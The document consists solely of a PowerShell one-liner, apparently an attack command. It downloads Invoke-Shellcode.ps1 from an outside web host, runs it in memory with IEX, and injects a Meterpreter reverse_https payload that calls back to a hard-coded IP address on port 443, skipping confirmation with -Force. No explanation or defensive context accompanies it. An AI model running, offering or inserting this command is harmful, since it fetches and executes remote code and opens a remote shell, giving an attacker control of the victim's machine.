
IEX (New-Object Net.WebClient).DownloadString('http://el8.pw/ps/CodeExecution/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 65.112.221.34 -Lport 443 -Force

